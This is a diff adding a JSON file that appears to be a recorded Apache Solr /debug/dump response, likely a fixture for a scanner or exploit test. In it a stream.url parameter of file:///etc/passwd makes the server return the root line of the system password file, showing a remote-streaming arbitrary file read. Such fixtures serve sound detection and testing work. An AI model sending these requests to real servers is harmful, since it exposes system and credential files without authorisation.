@@ -1,0 +1,31 @@
+{
+  "responseHeader": {
+    "status": 0,
+    "QTime": 6,
+    "handler": "org.apache.solr.handler.DumpRequestHandler",
+    "params": {
+      "param": "ContentStreams",
+      "stream.url": "file:///etc/passwd"
+    }
+  },
+  "params": {
+    "stream.url": "file:///etc/passwd",
+    "echoHandler": "true",
+    "param": "ContentStreams",
+    "echoParams": "explicit"
+  },
+  "streams": [
+    {
+      "name": null,
+      "sourceInfo": "url",
+      "size": null,
+      "contentType": null,
+      "stream": "root:x:0:0:root:/root:/bin/bash"
+    }
+  ],
+  "context": {
+    "webapp": "/solr",
+    "path": "/debug/dump",
+    "httpMethod": "GET"
+  }
+}
